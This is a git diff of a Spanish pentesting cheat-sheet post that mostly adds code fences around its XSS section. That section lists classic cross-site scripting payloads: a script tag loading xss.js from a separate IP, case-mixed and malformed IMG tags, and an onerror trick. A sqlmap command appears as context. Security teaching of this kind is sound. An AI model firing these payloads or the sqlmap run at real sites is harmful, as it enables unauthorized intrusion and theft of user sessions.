@@ -31,7 +31,7 @@ Debido al gran contenido que abarca la seguridad informatica, este post esta en 
 **[Enumerando MySQL](#enumerando-mysql)**<br>
 **[Enumerando Oracle](#enumerando-oracle)**<br>
 **[SQL Injections](#sqlinjections)**<br>
-**[XSS Injections](#xssinjections)**<br>  
+**[XSS Injections](#xssinjections)**<br>
 **[Realizando transferencias de zonas DNS](#dns-zone-transfers)**<br>
 **[Montando Sistemas de archivos compartidos](#montando-recursos-compartidos)**<br>
 **[Tecnicas de Fingerprinting](#tecnicas-de-fingerprinting)**<br>
@@ -467,19 +467,29 @@ sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --d
 ## XSS Injections  
 
 Prueba de XSS básica sin filtro de evasión  
+```html  
 <SCRIPT SRC=http://192.168.1.5/xss.js></SCRIPT>   
+```  
 
-Usando la etiqueta IMG con la directiva de JavaScript
+Usando la etiqueta IMG con la directiva de JavaScript  
+```html  
 <IMG SRC="javascript:alert('Hacked By Gerh');">    
+```  
   
 Evadiendo filtros anti XSS haciendo uso de minusculas y mayusculas    
+```html  
 <IMG SRC=JaVaScRiPt:alert('XSS')>  
+```  
 
 Etiquetas IMG mal formadas  
+```html  
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">  
+```  
 
 Haciendo uso del parametro **onerror**  
+```html  
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>  
+```  
 
 Referencia importante:  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet  
 
